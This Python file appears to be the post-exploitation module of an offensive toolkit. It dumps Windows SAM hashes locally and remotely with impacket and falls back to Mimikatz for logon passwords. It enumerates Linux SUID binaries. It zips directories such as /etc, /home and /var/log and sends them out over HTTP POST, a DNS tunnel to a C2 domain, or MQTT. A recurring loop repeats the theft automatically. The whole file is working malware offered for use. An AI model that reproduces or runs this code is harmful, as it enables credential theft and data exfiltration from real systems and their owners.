import os
import subprocess
import threading
import time
import traceback
import zipfile
import random
from pathlib import Path

from impacket.examples.secretsdump import LocalOperations, SAMHashes, RemoteOperations
from modules.logger import log_event
from modules.config import load_config

cfg = load_config()
EXFIL_DIR = Path("/tmp/exfil")
EXFIL_DIR.mkdir(parents=True, exist_ok=True)

# Enhancement: Exfiltration URL and aggressive mode
EXFIL_URL = os.getenv("POST_EXFIL_URL") or cfg.get("post_exfil_url")
AGGRESSIVE = os.getenv("POST_EXFIL_AGGRESSIVE") == "1"

def dump_credentials_windows(target="localhost", username="", password="", domain=""):
    try:
        if target.lower() == "localhost":
            lh = LocalOperations()
            hashes = SAMHashes(lh, "", False)
            hashes.dumpCachedHashes()
            data = hashes.getCredentialOutput()
            log_event("post_exploit", b"Local SAM dump complete.")
            # Enhancement: exfiltrate credentials if EXFIL_URL set
            if EXFIL_URL:
                try:
                    import requests
                    requests.post(EXFIL_URL, json={"type": "sam_dump", "target": target, "creds": data}, timeout=10)
                except Exception:
                    pass
            return {"status": True, "creds": data}
        else:
            ro = RemoteOperations(target, username, password, domain, isRemote=True)
            ro.connect()
            ro.dumpRegistry("", r"HKLM\SAM")
            ro.dumpRegistry("", r"HKLM\SECURITY")
            ro.dumpRegistry("", r"HKLM\SYSTEM")
            lm_hash, nt_hash = ro.getBootKeyAndHashes()
            out = ro.runHashes(lm_hash, nt_hash)
            log_event("post_exploit", f"Remote SAM dump from {target}".encode())
            if EXFIL_URL:
                try:
                    import requests
                    requests.post(EXFIL_URL, json={"type": "sam_dump", "target": target, "creds": out}, timeout=10)
                except Exception:
                    pass
            return {"status": True, "creds": out}
    except Exception as e:
        tb = traceback.format_exc()
        log_event("post_exploit", f"SAM dump error: {tb}".encode())
        if os.name == "nt":
            try:
                # Reflectively load Mimikatz binary (requires mem_malware or embedded)
                proc = subprocess.Popen(["mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate(timeout=30)
                if EXFIL_URL:
                    try:
                        import requests
                        requests.post(EXFIL_URL, json={"type": "mimikatz", "target": target, "creds": out.decode()}, timeout=10)
                    except Exception:
                        pass
                return {"status": True, "creds": out.decode()}
            except Exception as e2:
                tb2 = traceback.format_exc()
                log_event("post_exploit", f"Mimikatz fallback error: {tb2}".encode())
                return {"status": False, "error": str(e2)}
        return {"status": False, "error": str(e)}

def escalate_privileges_linux():
    result = []
    try:
        for path in Path("/usr/bin").rglob("*"):
            if path.is_file() and os.stat(path).st_mode & 0o4000:
                result.append(str(path))
        log_event("post_exploit", f"SUID binaries found: {len(result)}".encode())
        # Enhancement: exfiltrate SUID list if EXFIL_URL set
        if EXFIL_URL:
            try:
                import requests
                requests.post(EXFIL_URL, json={"type": "suid_enum", "binaries": result}, timeout=10)
            except Exception:
                pass
    except Exception as e:
        tb = traceback.format_exc()
        log_event("post_exploit", f"SUID enum error: {tb}".encode())
    return result

def data_exfiltration(dest_url: str, paths: list, async_mode: bool = True, method: str = "http"):
    """
    Supports multiple exfil methods:
      - http: HTTP POST
      - dns_tunnel: encode file in DNS subdomains
      - mqtt: publish to MQTT topic
    Enhanced: supports aggressive mode (AGGRESSIVE=1) to exfil all /etc, /home, and /var/log.
    """
    def _http_job(url, zip_path):
        try:
            files = {"file": open(zip_path, "rb")}
            r = requests.post(url, files=files, timeout=30)
            log_event("post_exploit", f"Exfil to {url} status: {r.status_code}".encode())
        except Exception as e:
            tb = traceback.format_exc()
            log_event("post_exploit", f"Exfil HTTP error: {tb}".encode())

    def _dns_tunnel_job(zip_path):
        """
        For each chunk, encode to base32, send as DNS query to a controlled subdomain.
        This is a placeholder to demonstrate technique.
        """
        try:
            import base64
            import socket
            domain = cfg.get("c2", {}).get("dns", {}).get("domain", "c2.example.com")
            data = open(zip_path, "rb").read()
            b32 = base64.b32encode(data).decode().rstrip("=")
            chunk_size = cfg.get("c2", {}).get("dns", {}).get("dns_tunnel", {}).get("chunk_length", 40)
            for i in range(0, len(b32), chunk_size):
                part = b32[i:i+chunk_size]
                sub = f"{part}.{domain}"
                try:
                    # Send a DNS query
                    socket.gethostbyname(sub)
                    time.sleep(0.2)
                except Exception:
                    time.sleep(0.2)
            log_event("post_exploit", f"Exfil via DNS tunnel completed: {zip_path.name}".encode())
        except Exception as e:
            tb = traceback.format_exc()
            log_event("post_exploit", f"DNS Tunnel exfil error: {tb}".encode())

    def _mqtt_job(zip_path):
        try:
            import paho.mqtt.client as mqtt
            broker = cfg.get("c2", {}).get("http", {}).get("mqtt_broker", "")
            port = cfg.get("c2", {}).get("http", {}).get("mqtt_port", 8883)
            topic = cfg.get("c2", {}).get("http", {}).get("mqtt_topic", "bismillah/exfil")
            client = mqtt.Client()
            client.tls_set()
            client.username_pw_set(
                cfg.get("c2", {}).get("http", {}).get("mqtt_username", ""),
                cfg.get("c2", {}).get("http", {}).get("mqtt_password", "")
            )
            client.connect(broker, port, 60)
            data = open(zip_path, "rb").read()
            client.publish(topic, data)
            client.disconnect()
            log_event("post_exploit", f"Exfil via MQTT completed: {zip_path.name}".encode())
        except Exception as e:
            tb = traceback.format_exc()
            log_event("post_exploit", f"MQTT exfil error: {tb}".encode())

    # Enhancement: aggressive mode exfiltrates all sensitive dirs
    if AGGRESSIVE:
        paths = list(set(paths + ["/etc", "/home", "/var/log"]))

    timestamp = int(time.time())
    zip_path = EXFIL_DIR / f"exfil_{timestamp}.zip"
    try:
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for p in paths:
                pth = Path(p)
                if pth.exists():
                    if pth.is_file():
                        zf.write(pth, arcname=pth.name)
                    else:
                        for sub in pth.rglob("*"):
                            if sub.is_file():
                                zf.write(sub, arcname=str(sub.relative_to(pth.parent)))
        log_event("post_exploit", f"Packaged exfil {zip_path.name}".encode())
        if async_mode:
            if method == "http":
                t = threading.Thread(target=_http_job, args=(dest_url, zip_path), daemon=True)
                t.start()
            elif method == "dns_tunnel":
                t = threading.Thread(target=_dns_tunnel_job, args=(zip_path,), daemon=True)
                t.start()
            elif method == "mqtt":
                t = threading.Thread(target=_mqtt_job, args=(zip_path,), daemon=True)
                t.start()
            return {"status": True, "detail": f"Exfil job started (method={method})"}
        else:
            if method == "http":
                _http_job(dest_url, zip_path)
            elif method == "dns_tunnel":
                _dns_tunnel_job(zip_path)
            elif method == "mqtt":
                _mqtt_job(zip_path)
            return {"status": True, "detail": "Exfil done"}
    except Exception as e:
        tb = traceback.format_exc()
        log_event("post_exploit", f"Exfil error: {tb}".encode())
        return {"status": False, "error": str(e)}

def run_post_exploit(method: str, **kwargs):
    if method == "dump_windows":
        return dump_credentials_windows(
            kwargs.get("target", "localhost"),
            kwargs.get("username", ""),
            kwargs.get("password", ""),
            kwargs.get("domain", "")
        )
    elif method == "escalate_linux":
        return {"suid_bins": escalate_privileges_linux()}
    elif method == "exfil":
        return data_exfiltration(
            kwargs.get("dest_url", EXFIL_URL or ""),
            kwargs.get("paths", []),
            kwargs.get("async_mode", True),
            kwargs.get("method", "http")
        )
    else:
        return {"status": False, "error": f"Unknown method '{method}'"}

def post_exploit_loop(interval: int = 1800):
    while True:
        try:
            if os.name == "nt":
                dump_credentials_windows(target="localhost")
            else:
                escalate_privileges_linux()
            # Enhancement: aggressive mode auto-exfil
            if AGGRESSIVE and EXFIL_URL:
                data_exfiltration(EXFIL_URL, ["/etc", "/home", "/var/log"], async_mode=True, method="http")
        except Exception as e:
            log_event("post_exploit", f"Post loop error: {e}".encode())
        time.sleep(interval)
